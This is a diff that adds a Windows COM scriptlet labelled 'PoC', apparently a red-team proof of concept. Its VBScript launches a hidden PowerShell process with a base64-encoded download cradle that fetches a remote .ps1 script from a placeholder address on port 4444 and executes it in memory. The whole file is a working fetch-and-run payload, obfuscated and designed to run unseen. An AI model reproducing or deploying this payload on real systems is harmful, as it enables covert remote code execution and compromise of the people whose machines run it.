@@ -1,0 +1,15 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+
+<script language="VBScript">
+Dim hgfrzd
+set hgfrzd = CreateObject("shell.application")
+hgfrzd.ShellExecute "powershell.exe", " -nop -w hidden -e SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADQANAA0ADQALwBXAEgAQQBUAF8AVABIAEUAXwBFAFgARQBDAFUAVABJAE8ATgBfAEMAUgBBAEQATABFAF8AVwBJAEwATABfAEYARQBUAEMASABfAGsAbgB6AHQAcgBlAC4AcABzADEAJwApAA==", "", "open", 0
+</script>
+
+</registration>
+</scriptlet>
